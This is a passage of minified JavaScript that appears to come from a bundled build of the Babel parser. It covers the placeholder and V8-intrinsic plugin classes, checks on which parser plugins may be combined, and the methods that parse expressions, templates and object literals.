G=Y?"ClassDeclaration":"ClassExpression";this.next();let H=this.state.strict,z=this.parsePlaceholder("Identifier");if(z)if(this.match(81)||this.match(133)||this.match(5))Q.id=z;else if(W||!Y)return Q.id=null,Q.body=this.finishPlaceholder(z,"ClassBody"),this.finishNode(Q,G);else throw this.raise(f$.ClassNameIsRequired,this.state.startLoc);else this.parseClassId(Q,Y,W);return super.parseClassSuper(Q),Q.body=this.parsePlaceholder("ClassBody")||super.parseClassBody(!!Q.superClass,H),this.finishNode(Q,G)}parseExport(Q,Y){let W=this.parsePlaceholder("Identifier");if(!W)return super.parseExport(Q,Y);let G=Q;if(!this.isContextual(98)&&!this.match(12))return G.specifiers=[],G.source=null,G.declaration=this.finishPlaceholder(W,"Declaration"),this.finishNode(G,"ExportNamedDeclaration");this.expectPlugin("exportDefaultFrom");let H=this.startNode();return H.exported=W,G.specifiers=[this.finishNode(H,"ExportDefaultSpecifier")],super.parseExport(G,Y)}isExportDefaultSpecifier(){if(this.match(65)){let Q=this.nextTokenStart();if(this.isUnparsedContextual(Q,"from")){if(this.input.startsWith(WX(133),this.nextTokenStartSince(Q+4)))return!0}}return super.isExportDefaultSpecifier()}maybeParseExportDefaultSpecifier(Q,Y){var W;if((W=Q.specifiers)!=null&&W.length)return!0;return super.maybeParseExportDefaultSpecifier(Q,Y)}checkExport(Q){let{specifiers:Y}=Q;if(Y!=null&&Y.length)Q.specifiers=Y.filter((W)=>W.exported.type==="Placeholder");super.checkExport(Q),Q.specifiers=Y}parseImport(Q){let Y=this.parsePlaceholder("Identifier");if(!Y)return super.parseImport(Q);if(Q.specifiers=[],!this.isContextual(98)&&!this.match(12))return Q.source=this.finishPlaceholder(Y,"StringLiteral"),this.semicolon(),this.finishNode(Q,"ImportDeclaration");let W=this.startNodeAtNode(Y);if(W.local=Y,Q.specifiers.push(this.finishNode(W,"ImportDefaultSpecifier")),this.eat(12)){if(!this.maybeParseStarImportSpecifier(Q))this.parseNamedImportSpecifiers(Q)}return this.expectContextual(98),Q.source=this.parseImportSource(),this.semicolon(),this.finishNode(Q,"ImportDeclaration")}parseImportSource(){return this.parsePlaceholder("StringLiteral")||super.parseImportSource()}assertNoSpace(){if(this.state.start>this.offsetToSourcePos(this.state.lastTokEndLoc.index))this.raise(f$.UnexpectedSpace,this.state.lastTokEndLoc)}},FS=(X)=>class extends X{parseV8Intrinsic(){if(this.match(54)){let Q=this.state.startLoc,Y=this.startNode();if(this.next(),W0(this.state.type)){let W=this.parseIdentifierName(),G=this.createIdentifier(Y,W);if(this.castNodeTo(G,"V8IntrinsicIdentifier"),this.match(10))return G}this.unexpected(Q)}}parseExprAtom(Q){return this.parseV8Intrinsic()||super.parseExprAtom(Q)}},x$=["minimal","fsharp","hack","smart"],h$=["^^","@@","^","%","#"];function RS(X){if(X.has("decorators")){if(X.has("decorators-legacy"))throw Error("Cannot use the decorators and decorators-legacy plugin together");let Y=X.get("decorators").decoratorsBeforeExport;if(Y!=null&&typeof Y!=="boolean")throw Error("'decoratorsBeforeExport' must be a boolean, if specified.");let W=X.get("decorators").allowCallParenthesized;if(W!=null&&typeof W!=="boolean")throw Error("'allowCallParenthesized' must be a boolean.")}if(X.has("flow")&&X.has("typescript"))throw Error("Cannot combine flow and typescript plugins.");if(X.has("placeholders")&&X.has("v8intrinsic"))throw Error("Cannot combine placeholders and v8intrinsic plugins.");if(X.has("pipelineOperator")){var J;let Y=X.get("pipelineOperator").proposal;if(!x$.includes(Y)){let W=x$.map((G)=>`"${G}"`).join(", ");throw Error(`"pipelineOperator" requires "proposal" option whose value must be one of: ${W}.`)}if(Y==="hack"){if(X.has("placeholders"))throw Error("Cannot combine placeholders plugin and Hack-style pipes.");if(X.has("v8intrinsic"))throw Error("Cannot combine v8intrinsic plugin and Hack-style pipes.");let W=X.get("pipelineOperator").topicToken;if(!h$.includes(W)){let G=h$.map((H)=>`"${H}"`).join(", ");throw Error(`"pipelineOperator" in "proposal": "hack" mode also requires a "topicToken" option whose value must be one of: ${G}.`)}{var Q;if(W==="#"&&((Q=X.get("recordAndTuple"))==null?void 0:Q.syntaxType)==="hash")throw Error(`Plugin conflict between \`["pipelineOperator", { proposal: "hack", topicToken: "#" }]\` and \`${JSON.stringify(["recordAndTuple",X.get("recordAndTuple")])}\`.`)}}else if(Y==="smart"&&((J=X.get("recordAndTuple"))==null?void 0:J.syntaxType)==="hash")throw Error(`Plugin conflict between \`["pipelineOperator", { proposal: "smart" }]\` and \`${JSON.stringify(["recordAndTuple",X.get("recordAndTuple")])}\`.`)}if(X.has("moduleAttributes")){if(X.has("deprecatedImportAssert")||X.has("importAssertions"))throw Error("Cannot combine importAssertions, deprecatedImportAssert and moduleAttributes plugins.");if(X.get("moduleAttributes").version!=="may-2020")throw Error("The 'moduleAttributes' plugin requires a 'version' option, representing the last proposal update. Currently, the only supported value is 'may-2020'.")}if(X.has("importAssertions")){if(X.has("deprecatedImportAssert"))throw Error("Cannot combine importAssertions and deprecatedImportAssert plugins.")}if(!X.has("deprecatedImportAssert")&&X.has("importAttributes")&&X.get("importAttributes").deprecatedAssertSyntax)X.set("deprecatedImportAssert",{});if(X.has("recordAndTuple")){let Y=X.get("recordAndTuple").syntaxType;if(Y!=null){let W=["hash","bar"];if(!W.includes(Y))throw Error("The 'syntaxType' option of the 'recordAndTuple' plugin must be one of: "+W.map((G)=>`'${G}'`).join(", "))}}if(X.has("asyncDoExpressions")&&!X.has("doExpressions")){let Y=Error("'asyncDoExpressions' requires 'doExpressions', please add 'doExpressions' to parser plugins.");throw Y.missingPlugins="doExpressions",Y}if(X.has("optionalChainingAssign")&&X.get("optionalChainingAssign").version!=="2023-07")throw Error("The 'optionalChainingAssign' plugin requires a 'version' option, representing the last proposal update. Currently, the only supported value is '2023-07'.");if(X.has("discardBinding")&&X.get("discardBinding").syntaxType!=="void")throw Error("The 'discardBinding' plugin requires a 'syntaxType' option. Currently the only supported value is 'void'.")}var qV={estree:NP,jsx:JS,flow:oP,typescript:qS,v8intrinsic:FS,placeholders:OS},AS=Object.keys(qV);class BV extends KV{checkProto(X,J,Q,Y){if(X.type==="SpreadElement"||this.isObjectMethod(X)||X.computed||X.shorthand)return Q;let W=X.key;if((W.type==="Identifier"?W.name:W.value)==="__proto__"){if(J)return this.raise(S.RecordNoProto,W),!0;if(Q)if(Y){if(Y.doubleProtoLoc===null)Y.doubleProtoLoc=W.loc.start}else this.raise(S.DuplicateProto,W);return!0}return Q}shouldExitDescending(X,J){return X.type==="ArrowFunctionExpression"&&this.offsetToSourcePos(X.start)===J}getExpression(){if(this.enterInitialScopes(),this.nextToken(),this.match(140))throw this.raise(S.ParseExpressionEmptyInput,this.state.startLoc);let X=this.parseExpression();if(!this.match(140))throw this.raise(S.ParseExpressionExpectsEOF,this.state.startLoc,{unexpected:this.input.codePointAt(this.state.start)});if(this.finalizeRemainingComments(),X.comments=this.comments,X.errors=this.state.errors,this.optionFlags&256)X.tokens=this.tokens;return X}parseExpression(X,J){if(X)return this.disallowInAnd(()=>this.parseExpressionBase(J));return this.allowInAnd(()=>this.parseExpressionBase(J))}parseExpressionBase(X){let J=this.state.startLoc,Q=this.parseMaybeAssign(X);if(this.match(12)){let Y=this.startNodeAt(J);Y.expressions=[Q];while(this.eat(12))Y.expressions.push(this.parseMaybeAssign(X));return this.toReferencedList(Y.expressions),this.finishNode(Y,"SequenceExpression")}return Q}parseMaybeAssignDisallowIn(X,J){return this.disallowInAnd(()=>this.parseMaybeAssign(X,J))}parseMaybeAssignAllowIn(X,J){return this.allowInAnd(()=>this.parseMaybeAssign(X,J))}setOptionalParametersError(X){X.optionalParametersLoc=this.state.startLoc}parseMaybeAssign(X,J){let Q=this.state.startLoc,Y=this.isContextual(108);if(Y){if(this.prodParam.hasYield){this.next();let z=this.parseYield(Q);if(J)z=J.call(this,z,Q);return z}}let W;if(X)W=!1;else X=new pJ,W=!0;let{type:G}=this.state;if(G===10||W0(G))this.state.potentialArrowAt=this.state.start;let H=this.parseMaybeConditional(X);if(J)H=J.call(this,H,Q);if(SP(this.state.type)){let z=this.startNodeAt(Q),$=this.state.value;if(z.operator=$,this.match(29)){this.toAssignable(H,!0),z.left=H;let V=Q.index;if(X.doubleProtoLoc!=null&&X.doubleProtoLoc.index>=V)X.doubleProtoLoc=null;if(X.shorthandAssignLoc!=null&&X.shorthandAssignLoc.index>=V)X.shorthandAssignLoc=null;if(X.privateKeyLoc!=null&&X.privateKeyLoc.index>=V)this.checkDestructuringPrivate(X),X.privateKeyLoc=null;if(X.voidPatternLoc!=null&&X.voidPatternLoc.index>=V)X.voidPatternLoc=null}else z.left=H;return this.next(),z.right=this.parseMaybeAssign(),this.checkLVal(H,this.finishNode(z,"AssignmentExpression")),z}else if(W)this.checkExpressionErrors(X,!0);if(Y){let{type:z}=this.state;if((this.hasPlugin("v8intrinsic")?uJ(z):uJ(z)&&!this.match(54))&&!this.isAmbiguousPrefixOrIdentifier())return this.raiseOverwrite(S.YieldNotInGeneratorFunction,Q),this.parseYield(Q)}return H}parseMaybeConditional(X){let J=this.state.startLoc,Q=this.state.potentialArrowAt,Y=this.parseExprOps(X);if(this.shouldExitDescending(Y,Q))return Y;return this.parseConditional(Y,J,X)}parseConditional(X,J,Q){if(this.eat(17)){let Y=this.startNodeAt(J);return Y.test=X,Y.consequent=this.parseMaybeAssignAllowIn(),this.expect(14),Y.alternate=this.parseMaybeAssign(),this.finishNode(Y,"ConditionalExpression")}return X}parseMaybeUnaryOrPrivate(X){return this.match(139)?this.parsePrivateName():this.parseMaybeUnary(X)}parseExprOps(X){let J=this.state.startLoc,Q=this.state.potentialArrowAt,Y=this.parseMaybeUnaryOrPrivate(X);if(this.shouldExitDescending(Y,Q))return Y;return this.parseExprOp(Y,J,-1)}parseExprOp(X,J,Q){if(this.isPrivateName(X)){let W=this.getPrivateNameSV(X);if(Q>=b5(58)||!this.prodParam.hasIn||!this.match(58))this.raise(S.PrivateInExpectedIn,X,{identifierName:W});this.classScope.usePrivateName(W,X.loc.start)}let Y=this.state.type;if(_P(Y)&&(this.prodParam.hasIn||!this.match(58))){let W=b5(Y);if(W>Q){if(Y===39){if(this.expectPlugin("pipelineOperator"),this.state.inFSharpPipelineDirectBody)return X;this.checkPipelineAtInfixOperator(X,J)}let G=this.startNodeAt(J);G.left=X,G.operator=this.state.value;let H=Y===41||Y===42,z=Y===40;if(z)W=b5(42);if(this.next(),Y===39&&this.hasPlugin(["pipelineOperator",{proposal:"minimal"}])){if(this.state.type===96&&this.prodParam.hasAwait)throw this.raise(S.UnexpectedAwaitAfterPipelineBody,this.state.startLoc)}G.right=this.parseExprOpRightExpr(Y,W);let $=this.finishNode(G,H||z?"LogicalExpression":"BinaryExpression"),V=this.state.type;if(z&&(V===41||V===42)||H&&V===40)throw this.raise(S.MixingCoalesceWithLogical,this.state.startLoc);return this.parseExprOp($,J,Q)}}return X}parseExprOpRightExpr(X,J){let Q=this.state.startLoc;switch(X){case 39:switch(this.getPluginOption("pipelineOperator","proposal")){case"hack":return this.withTopicBindingContext(()=>{return this.parseHackPipeBody()});case"fsharp":return this.withSoloAwaitPermittingContext(()=>{return this.parseFSharpPipelineBody(J)})}if(this.getPluginOption("pipelineOperator","proposal")==="smart")return this.withTopicBindingContext(()=>{if(this.prodParam.hasYield&&this.isContextual(108))throw this.raise(S.PipeBodyIsTighter,this.state.startLoc);return this.parseSmartPipelineBodyInStyle(this.parseExprOpBaseRightExpr(X,J),Q)});default:return this.parseExprOpBaseRightExpr(X,J)}}parseExprOpBaseRightExpr(X,J){let Q=this.state.startLoc;return this.parseExprOp(this.parseMaybeUnaryOrPrivate(),Q,fP(X)?J-1:J)}parseHackPipeBody(){var X;let{startLoc:J}=this.state,Q=this.parseMaybeAssign();if(jP.has(Q.type)&&!((X=Q.extra)!=null&&X.parenthesized))this.raise(S.PipeUnparenthesizedBody,J,{type:Q.type});if(!this.topicReferenceWasUsedInCurrentContext())this.raise(S.PipeTopicUnused,J);return Q}checkExponentialAfterUnary(X){if(this.match(57))this.raise(S.UnexpectedTokenUnaryExponentiation,X.argument)}parseMaybeUnary(X,J){let Q=this.state.startLoc,Y=this.isContextual(96);if(Y&&this.recordAwaitIfAllowed()){this.next();let z=this.parseAwait(Q);if(!J)this.checkExponentialAfterUnary(z);return z}let W=this.match(34),G=this.startNode();if(kP(this.state.type)){if(G.operator=this.state.value,G.prefix=!0,this.match(72))this.expectPlugin("throwExpressions");let z=this.match(89);if(this.next(),G.argument=this.parseMaybeUnary(null,!0),this.checkExpressionErrors(X,!0),this.state.strict&&z){let $=G.argument;if($.type==="Identifier")this.raise(S.StrictDelete,G);else if(this.hasPropertyAsPrivateName($))this.raise(S.DeletePrivateField,G)}if(!W){if(!J)this.checkExponentialAfterUnary(G);return this.finishNode(G,"UnaryExpression")}}let H=this.parseUpdate(G,W,X);if(Y){let{type:z}=this.state;if((this.hasPlugin("v8intrinsic")?uJ(z):uJ(z)&&!this.match(54))&&!this.isAmbiguousPrefixOrIdentifier())return this.raiseOverwrite(S.AwaitNotInAsyncContext,Q),this.parseAwait(Q)}return H}parseUpdate(X,J,Q){if(J){let G=X;return this.checkLVal(G.argument,this.finishNode(G,"UpdateExpression")),X}let Y=this.state.startLoc,W=this.parseExprSubscripts(Q);if(this.checkExpressionErrors(Q,!1))return W;while(EP(this.state.type)&&!this.canInsertSemicolon()){let G=this.startNodeAt(Y);G.operator=this.state.value,G.prefix=!1,G.argument=W,this.next(),this.checkLVal(W,W=this.finishNode(G,"UpdateExpression"))}return W}parseExprSubscripts(X){let J=this.state.startLoc,Q=this.state.potentialArrowAt,Y=this.parseExprAtom(X);if(this.shouldExitDescending(Y,Q))return Y;return this.parseSubscripts(Y,J)}parseSubscripts(X,J,Q){let Y={optionalChainMember:!1,maybeAsyncArrow:this.atPossibleAsyncArrow(X),stop:!1};do X=this.parseSubscript(X,J,Q,Y),Y.maybeAsyncArrow=!1;while(!Y.stop);return X}parseSubscript(X,J,Q,Y){let{type:W}=this.state;if(!Q&&W===15)return this.parseBind(X,J,Q,Y);else if(f5(W))return this.parseTaggedTemplateExpression(X,J,Y);let G=!1;if(W===18){if(Q){if(this.raise(S.OptionalChainingNoNew,this.state.startLoc),this.lookaheadCharCode()===40)return this.stopParseSubscript(X,Y)}Y.optionalChainMember=G=!0,this.next()}if(!Q&&this.match(10))return this.parseCoverCallAndAsyncArrowHead(X,J,Y,G);else{let H=this.eat(0);if(H||G||this.eat(16))return this.parseMember(X,J,Y,H,G);else return this.stopParseSubscript(X,Y)}}stopParseSubscript(X,J){return J.stop=!0,X}parseMember(X,J,Q,Y,W){let G=this.startNodeAt(J);if(G.object=X,G.computed=Y,Y)G.property=this.parseExpression(),this.expect(3);else if(this.match(139)){if(X.type==="Super")this.raise(S.SuperPrivateField,J);this.classScope.usePrivateName(this.state.value,this.state.startLoc),G.property=this.parsePrivateName()}else G.property=this.parseIdentifier(!0);if(Q.optionalChainMember)return G.optional=W,this.finishNode(G,"OptionalMemberExpression");else return this.finishNode(G,"MemberExpression")}parseBind(X,J,Q,Y){let W=this.startNodeAt(J);return W.object=X,this.next(),W.callee=this.parseNoCallExpr(),Y.stop=!0,this.parseSubscripts(this.finishNode(W,"BindExpression"),J,Q)}parseCoverCallAndAsyncArrowHead(X,J,Q,Y){let W=this.state.maybeInArrowParameters,G=null;this.state.maybeInArrowParameters=!0,this.next();let H=this.startNodeAt(J);H.callee=X;let{maybeAsyncArrow:z,optionalChainMember:$}=Q;if(z)this.expressionScope.enter(VS()),G=new pJ;if($)H.optional=Y;if(Y)H.arguments=this.parseCallExpressionArguments();else H.arguments=this.parseCallExpressionArguments(X.type!=="Super",H,G);let V=this.finishCallExpression(H,$);if(z&&this.shouldParseAsyncArrow()&&!Y)Q.stop=!0,this.checkDestructuringPrivate(G),this.expressionScope.validateAsPattern(),this.expressionScope.exit(),V=this.parseAsyncArrowFromCallExpression(this.startNodeAt(J),V);else{if(z)this.checkExpressionErrors(G,!0),this.expressionScope.exit();this.toReferencedArguments(V)}return this.state.maybeInArrowParameters=W,V}toReferencedArguments(X,J){this.toReferencedListDeep(X.arguments,J)}parseTaggedTemplateExpression(X,J,Q){let Y=this.startNodeAt(J);if(Y.tag=X,Y.quasi=this.parseTemplate(!0),Q.optionalChainMember)this.raise(S.OptionalChainingNoTemplate,J);return this.finishNode(Y,"TaggedTemplateExpression")}atPossibleAsyncArrow(X){return X.type==="Identifier"&&X.name==="async"&&this.state.lastTokEndLoc.index===X.end&&!this.canInsertSemicolon()&&X.end-X.start===5&&this.offsetToSourcePos(X.start)===this.state.potentialArrowAt}finishCallExpression(X,J){if(X.callee.type==="Import"){if(X.arguments.length===0||X.arguments.length>2)this.raise(S.ImportCallArity,X);else for(let Q of X.arguments)if(Q.type==="SpreadElement")this.raise(S.ImportCallSpreadArgument,Q)}return this.finishNode(X,J?"OptionalCallExpression":"CallExpression")}parseCallExpressionArguments(X,J,Q){let Y=[],W=!0,G=this.state.inFSharpPipelineDirectBody;this.state.inFSharpPipelineDirectBody=!1;while(!this.eat(11)){if(W)W=!1;else if(this.expect(12),this.match(11)){if(J)this.addTrailingCommaExtraToNode(J);this.next();break}Y.push(this.parseExprListItem(11,!1,Q,X))}return this.state.inFSharpPipelineDirectBody=G,Y}shouldParseAsyncArrow(){return this.match(19)&&!this.canInsertSemicolon()}parseAsyncArrowFromCallExpression(X,J){var Q;if(this.resetPreviousNodeTrailingComments(J),this.expect(19),this.parseArrowExpression(X,J.arguments,!0,(Q=J.extra)==null?void 0:Q.trailingCommaLoc),J.innerComments)iJ(X,J.innerComments);if(J.callee.trailingComments)iJ(X,J.callee.trailingComments);return X}parseNoCallExpr(){let X=this.state.startLoc;return this.parseSubscripts(this.parseExprAtom(),X,!0)}parseExprAtom(X){let J,Q=null,{type:Y}=this.state;switch(Y){case 79:return this.parseSuper();case 83:if(J=this.startNode(),this.next(),this.match(16))return this.parseImportMetaPropertyOrPhaseCall(J);if(this.match(10))if(this.optionFlags&512)return this.parseImportCall(J);else return this.finishNode(J,"Import");else return this.raise(S.UnsupportedImport,this.state.lastTokStartLoc),this.finishNode(J,"Import");case 78:return J=this.startNode(),this.next(),this.finishNode(J,"ThisExpression");case 90:return this.parseDo(this.startNode(),!1);case 56:case 31:return this.readRegexp(),this.parseRegExpLiteral(this.state.value);case 135:return this.parseNumericLiteral(this.state.value);case 136:return this.parseBigIntLiteral(this.state.value);case 134:return this.parseStringLiteral(this.state.value);case 84:return this.parseNullLiteral();case 85:return this.parseBooleanLiteral(!0);case 86:return this.parseBooleanLiteral(!1);case 10:{let W=this.state.potentialArrowAt===this.state.start;return this.parseParenAndDistinguishExpression(W)}case 0:return this.parseArrayLike(3,!0,!1,X);case 5:return this.parseObjectLike(8,!1,!1,X);case 68:return this.parseFunctionOrFunctionSent();case 26:Q=this.parseDecorators();case 80:return this.parseClass(this.maybeTakeDecorators(Q,this.startNode()),!1);case 77:return this.parseNewOrNewTarget();case 25:case 24:return this.parseTemplate(!1);case 15:{J=this.startNode(),this.next(),J.object=null;let W=J.callee=this.parseNoCallExpr();if(W.type==="MemberExpression")return this.finishNode(J,"BindExpression");else throw this.raise(S.UnsupportedBind,W)}case 139:return this.raise(S.PrivateInExpectedIn,this.state.startLoc,{identifierName:this.state.value}),this.parsePrivateName();case 33:return this.parseTopicReferenceThenEqualsSign(54,"%");case 32:return this.parseTopicReferenceThenEqualsSign(44,"^");case 37:case 38:return this.parseTopicReference("hack");case 44:case 54:case 27:{let W=this.getPluginOption("pipelineOperator","proposal");if(W)return this.parseTopicReference(W);this.unexpected();break}case 47:{let W=this.input.codePointAt(this.nextTokenStart());if(_6(W)||W===62)this.expectOnePlugin(["jsx","flow","typescript"]);else this.unexpected();break}default:if(Y===137)return this.parseDecimalLiteral(this.state.value);else if(Y===2||Y===1)return this.parseArrayLike(this.state.type===2?4:3,!1,!0);else if(Y===6||Y===7)return this.parseObjectLike(this.state.type===6?9:8,!1,!0);if(W0(Y)){if(this.isContextual(127)&&this.lookaheadInLineCharCode()===123)return this.parseModuleExpression();let W=this.state.potentialArrowAt===this.state.start,G=this.state.containsEsc,H=this.parseIdentifier();if(!G&&H.name==="async"&&!this.canInsertSemicolon()){let{type:z}=this.state;if(z===68)return this.resetPreviousNodeTrailingComments(H),this.next(),this.parseAsyncFunctionExpression(this.startNodeAtNode(H));else if(W0(z))if(this.lookaheadCharCode()===61)return this.parseAsyncArrowUnaryFunction(this.startNodeAtNode(H));else return H;else if(z===90)return this.resetPreviousNodeTrailingComments(H),this.parseDo(this.startNodeAtNode(H),!0)}if(W&&this.match(19)&&!this.canInsertSemicolon())return this.next(),this.parseArrowExpression(this.startNodeAtNode(H),[H],!1);return H}else this.unexpected()}}parseTopicReferenceThenEqualsSign(X,J){let Q=this.getPluginOption("pipelineOperator","proposal");if(Q)return this.state.type=X,this.state.value=J,this.state.pos--,this.state.end--,this.state.endLoc=a0(this.state.endLoc,-1),this.parseTopicReference(Q);else this.unexpected()}parseTopicReference(X){let J=this.startNode(),Q=this.state.startLoc,Y=this.state.type;return this.next(),this.finishTopicReference(J,Q,X,Y)}finishTopicReference(X,J,Q,Y){if(this.testTopicReferenceConfiguration(Q,J,Y))if(Q==="hack"){if(!this.topicReferenceIsAllowedInCurrentContext())this.raise(S.PipeTopicUnbound,J);return this.registerTopicReference(),this.finishNode(X,"TopicReference")}else{if(!this.topicReferenceIsAllowedInCurrentContext())this.raise(S.PrimaryTopicNotAllowed,J);return this.registerTopicReference(),this.finishNode(X,"PipelinePrimaryTopicReference")}else throw this.raise(S.PipeTopicUnconfiguredToken,J,{token:WX(Y)})}testTopicReferenceConfiguration(X,J,Q){switch(X){case"hack":return this.hasPlugin(["pipelineOperator",{topicToken:WX(Q)}]);case"smart":return Q===27;default:throw this.raise(S.PipeTopicRequiresHackPipes,J)}}parseAsyncArrowUnaryFunction(X){this.prodParam.enter(v5(!0,this.prodParam.hasYield));let J=[this.parseIdentifier()];if(this.prodParam.exit(),this.hasPrecedingLineBreak())this.raise(S.LineTerminatorBeforeArrow,this.state.curPosition());return this.expect(19),this.parseArrowExpression(X,J,!0)}parseDo(X,J){if(this.expectPlugin("doExpressions"),J)this.expectPlugin("asyncDoExpressions");X.async=J,this.next();let Q=this.state.labels;if(this.state.labels=[],J)this.prodParam.enter(2),X.body=this.parseBlock(),this.prodParam.exit();else X.body=this.parseBlock();return this.state.labels=Q,this.finishNode(X,"DoExpression")}parseSuper(){let X=this.startNode();if(this.next(),this.match(10)&&!this.scope.allowDirectSuper&&!(this.optionFlags&16))this.raise(S.SuperNotAllowed,X);else if(!this.scope.allowSuper&&!(this.optionFlags&16))this.raise(S.UnexpectedSuper,X);if(!this.match(10)&&!this.match(0)&&!this.match(16))this.raise(S.UnsupportedSuper,X);return this.finishNode(X,"Super")}parsePrivateName(){let X=this.startNode(),J=this.startNodeAt(a0(this.state.startLoc,1)),Q=this.state.value;return this.next(),X.id=this.createIdentifier(J,Q),this.finishNode(X,"PrivateName")}parseFunctionOrFunctionSent(){let X=this.startNode();if(this.next(),this.prodParam.hasYield&&this.match(16)){let J=this.createIdentifier(this.startNodeAtNode(X),"function");if(this.next(),this.match(103))this.expectPlugin("functionSent");else if(!this.hasPlugin("functionSent"))this.unexpected();return this.parseMetaProperty(X,J,"sent")}return this.parseFunction(X)}parseMetaProperty(X,J,Q){X.meta=J;let Y=this.state.containsEsc;if(X.property=this.parseIdentifier(!0),X.property.name!==Q||Y)this.raise(S.UnsupportedMetaProperty,X.property,{target:J.name,onlyValidPropertyName:Q});return this.finishNode(X,"MetaProperty")}parseImportMetaPropertyOrPhaseCall(X){if(this.next(),this.isContextual(105)||this.isContextual(97)){let J=this.isContextual(105);return this.expectPlugin(J?"sourcePhaseImports":"deferredImportEvaluation"),this.next(),X.phase=J?"source":"defer",this.parseImportCall(X)}else{let J=this.createIdentifierAt(this.startNodeAtNode(X),"import",this.state.lastTokStartLoc);if(this.isContextual(101)){if(!this.inModule)this.raise(S.ImportMetaOutsideModule,J);this.sawUnambiguousESM=!0}return this.parseMetaProperty(X,J,"meta")}}parseLiteralAtNode(X,J,Q){return this.addExtra(Q,"rawValue",X),this.addExtra(Q,"raw",this.input.slice(this.offsetToSourcePos(Q.start),this.state.end)),Q.value=X,this.next(),this.finishNode(Q,J)}parseLiteral(X,J){let Q=this.startNode();return this.parseLiteralAtNode(X,J,Q)}parseStringLiteral(X){return this.parseLiteral(X,"StringLiteral")}parseNumericLiteral(X){return this.parseLiteral(X,"NumericLiteral")}parseBigIntLiteral(X){return this.parseLiteral(X,"BigIntLiteral")}parseDecimalLiteral(X){return this.parseLiteral(X,"DecimalLiteral")}parseRegExpLiteral(X){let J=this.startNode();return this.addExtra(J,"raw",this.input.slice(this.offsetToSourcePos(J.start),this.state.end)),J.pattern=X.pattern,J.flags=X.flags,this.next(),this.finishNode(J,"RegExpLiteral")}parseBooleanLiteral(X){let J=this.startNode();return J.value=X,this.next(),this.finishNode(J,"BooleanLiteral")}parseNullLiteral(){let X=this.startNode();return this.next(),this.finishNode(X,"NullLiteral")}parseParenAndDistinguishExpression(X){let J=this.state.startLoc,Q;this.next(),this.expressionScope.enter($S());let Y=this.state.maybeInArrowParameters,W=this.state.inFSharpPipelineDirectBody;this.state.maybeInArrowParameters=!0,this.state.inFSharpPipelineDirectBody=!1;let G=this.state.startLoc,H=[],z=new pJ,$=!0,V,K;while(!this.match(11)){if($)$=!1;else if(this.expect(12,z.optionalParametersLoc===null?null:z.optionalParametersLoc),this.match(11)){K=this.state.startLoc;break}if(this.match(21)){let B=this.state.startLoc;if(V=this.state.startLoc,H.push(this.parseParenItem(this.parseRestBinding(),B)),!this.checkCommaAfterRest(41))break}else H.push(this.parseMaybeAssignAllowInOrVoidPattern(11,z,this.parseParenItem))}let Z=this.state.lastTokEndLoc;this.expect(11),this.state.maybeInArrowParameters=Y,this.state.inFSharpPipelineDirectBody=W;let q=this.startNodeAt(J);if(X&&this.shouldParseArrow(H)&&(q=this.parseArrow(q)))return this.checkDestructuringPrivate(z),this.expressionScope.validateAsPattern(),this.expressionScope.exit(),this.parseArrowExpression(q,H,!1),q;if(this.expressionScope.exit(),!H.length)this.unexpected(this.state.lastTokStartLoc);if(K)this.unexpected(K);if(V)this.unexpected(V);if(this.checkExpressionErrors(z,!0),this.toReferencedListDeep(H,!0),H.length>1)Q=this.startNodeAt(G),Q.expressions=H,this.finishNode(Q,"SequenceExpression"),this.resetEndLocation(Q,Z);else Q=H[0];return this.wrapParenthesis(J,Q)}wrapParenthesis(X,J){if(!(this.optionFlags&1024))return this.addExtra(J,"parenthesized",!0),this.addExtra(J,"parenStart",X.index),this.takeSurroundingComments(J,X.index,this.state.lastTokEndLoc.index),J;let Q=this.startNodeAt(X);return Q.expression=J,this.finishNode(Q,"ParenthesizedExpression")}shouldParseArrow(X){return!this.canInsertSemicolon()}parseArrow(X){if(this.eat(19))return X}parseParenItem(X,J){return X}parseNewOrNewTarget(){let X=this.startNode();if(this.next(),this.match(16)){let J=this.createIdentifier(this.startNodeAtNode(X),"new");this.next();let Q=this.parseMetaProperty(X,J,"target");if(!this.scope.allowNewTarget)this.raise(S.UnexpectedNewTarget,Q);return Q}return this.parseNew(X)}parseNew(X){if(this.parseNewCallee(X),this.eat(10)){let J=this.parseExprList(11);this.toReferencedList(J),X.arguments=J}else X.arguments=[];return this.finishNode(X,"NewExpression")}parseNewCallee(X){let J=this.match(83),Q=this.parseNoCallExpr();if(X.callee=Q,J&&(Q.type==="Import"||Q.type==="ImportExpression"))this.raise(S.ImportCallNotNewExpression,Q)}parseTemplateElement(X){let{start:J,startLoc:Q,end:Y,value:W}=this.state,G=J+1,H=this.startNodeAt(a0(Q,1));if(W===null){if(!X)this.raise(S.InvalidEscapeSequenceTemplate,a0(this.state.firstInvalidTemplateEscapePos,1))}let z=this.match(24),$=z?-1:-2,V=Y+$;H.value={raw:this.input.slice(G,V).replace(/\r\n?/g,`
`),cooked:W===null?null:W.slice(1,$)},H.tail=z,this.next();let K=this.finishNode(H,"TemplateElement");return this.resetEndLocation(K,a0(this.state.lastTokEndLoc,$)),K}parseTemplate(X){let J=this.startNode(),Q=this.parseTemplateElement(X),Y=[Q],W=[];while(!Q.tail)W.push(this.parseTemplateSubstitution()),this.readTemplateContinuation(),Y.push(Q=this.parseTemplateElement(X));return J.expressions=W,J.quasis=Y,this.finishNode(J,"TemplateLiteral")}parseTemplateSubstitution(){return this.parseExpression()}parseObjectLike(X,J,Q,Y){if(Q)this.expectPlugin("recordAndTuple");let W=this.state.inFSharpPipelineDirectBody;this.state.inFSharpPipelineDirectBody=!1;let G=!1,H=!0,z=this.startNode();z.properties=[],this.next();while(!this.match(X)){if(H)H=!1;else if(this.expect(12),this.match(X)){this.addTrailingCommaExtraToNode(z);break}let V;if(J)V=this.parseBindingProperty();else V=this.parsePropertyDefinition(Y),G=this.checkProto(V,Q,G,Y);if(Q&&!this.isObjectProperty(V)&&V.type!=="SpreadElement")this.raise(S.InvalidRecordProperty,V);if(V.shorthand)this.addExtra(V,"shorthand",!0);z.properties.push(V)}this.next(),this.state.inFSharpPipelineDirectBody=W;let $="ObjectExpression";if(J)$="ObjectPattern";else if(Q)$="RecordExpression";return this.finishNode(z,$)}addTrailingCommaExtraToNode(X){this.addExtra(X,"trailingComma",this.state.lastTokStartLoc.index),this.addExtra(X,"trailingCommaLoc",this.state.lastTokStartLoc,!1)}maybeAsyncOrAccessorProp(X){return!X.computed&&X.key.type==="Identifier"&&(this.isLiteralPropertyName()||this.match(0)||this.match(55))}parsePropertyDefinition(X){let 